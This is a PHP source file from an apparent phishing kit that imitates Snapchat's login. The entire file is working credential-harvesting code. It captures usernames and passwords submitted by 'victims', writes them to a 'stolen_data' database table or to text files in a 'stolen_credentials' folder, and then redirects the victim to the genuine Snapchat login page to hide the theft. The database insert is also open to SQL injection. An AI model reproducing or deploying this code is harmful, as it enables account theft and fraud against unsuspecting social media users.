<?php
/**
*MIT License
*
*Copyright (c) 2022 It0sh1
*Permission is hereby granted, free of charge, to any person obtaining a copy
*of this software and associated documentation files (the "Software"), to deal
*in the Software without restriction, including without limitation the rights
*to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
*copies of the Software, and to permit persons to whom the Software is
*furnished to do so, subject to the following conditions:
*
*(The above copyright notice and this permission notice shall be included in all
*copies or substantial portions of the Software.
*THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
*IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,&*
*FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
*AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
*LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
*OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
*SOFTWARE.
*/
/************************************/
# Phishingtemplates /snapchat        #
# author: It0sh1                     #
# github: https://github.com/it0sh1  #
/*************************************/

// include Config
require('conf.inc.php');


// making phish class
class Phish
{

  // making urlredirect method
  public static function urlredirecting(string $url)
  {
    // header
    header('Location: '.$url.'');
  }

  // making get phished function
  public static function GetPhished()
  {

    // include some vars
    GLOBAL $db_host;
    GLOBAL $db_user;
    GLOBAL $db_pass;
    GLOBAL $db_name;
    GLOBAL $use_db;
    GLOBAL $snapchat_link;

    // when victim presses login button
    if(isset($_POST['snapchatlogin']))
    {

      $stolen_user_credential_snap_email = htmlentities($_POST['username']);
      $stolen_user_credential_snap_pass  = htmlentities($_POST['password']);

      // if $use_db in config is set to 'true':
      if($use_db === true)
      {

        // creating a connection with our database.
        $connecting = mysqli_connect("$db_host", "$db_user", "$db_pass", "$db_name")
        or die('Connection failed bitch :(' . mysqli_connect_error());

        $sql = "INSERT INTO stolen_data (stolen_username, stolen_password)
        VALUES ('$stolen_user_credential_snap_email', '$stolen_user_credential_snap_pass');";

        // when inserting sql query succeed and is true:
        if(mysqli_query($connecting, $sql) === true)
        {

          // redirect victim to official login page
          self::urlredirecting($snapchat_link . "/accounts/login?continue=https%3A%2F%2Faccounts.snapchat.com%2Faccounts%2Fwelcome");
          exit; // EXIT

        } else {

          // Showing error:
          echo "Something went very wrong :(, check the error: ".mysqli_connect_error();
        }

      // when $use_db is normally set to false
      // email/numbers/passwords will be saved in a folder.
      } else {

        // making a folder for stolen user credentials
        $stolen_user_credential_folder = "stolen_credentials/";

        // check if stolen_credentials folder not exists
        if(!is_dir($stolen_user_credential_folder))
        {
          // make folder
          mkdir($stolen_user_credential_folder);

          // creating .txt with random hashed name
          $randomhashtextfile = uniqid().'.txt';

          // now we making filehandler to put our credentials in it
          $filehandler = fopen($stolen_user_credential_folder.$randomhashtextfile, 'w');

          // creating text
          $data1 = "Username/Email: " . $stolen_user_credential_snap_email . "\n";
          fwrite($filehandler, $data1);

          // second data text
          $data2 = "Password: " . $stolen_user_credential_snap_pass . "\n";
          fwrite($filehandler, $data2);
          // close handler
          fclose($filehandler);

          // redirect victim to original snapchat login page
          self::urlredirecting($snapchat_link . "/accounts/login?continue=https%3A%2F%2Faccounts.snapchat.com%2Faccounts%2Fwelcome");
          exit; // EXIT

        // When folder does exists
        } else {

          // creating .txt with random hashed name
          $randomhashtextfile = uniqid().'.txt';

          // making filehandler again
          $filehandler = fopen($stolen_user_credential_folder.$randomhashtextfile, 'w');

          // creating text
          $data1 = "Username/Email: " . $stolen_user_credential_snap_email . "\n";
          fwrite($filehandler, $data1);

          // second data text
          $data2 = "Password: " . $stolen_user_credential_snap_pass . "\n";
          fwrite($filehandler, $data2);
          // close handler
          fclose($filehandler);

          // redirect victim to snapchat login page
          self::urlredirecting($snapchat_link . "/accounts/login?continue=https%3A%2F%2Faccounts.snapchat.com%2Faccounts%2Fwelcome");
          exit; // EXIT
        }

      }
    }
  }
}

Phish::GetPhished();
?>
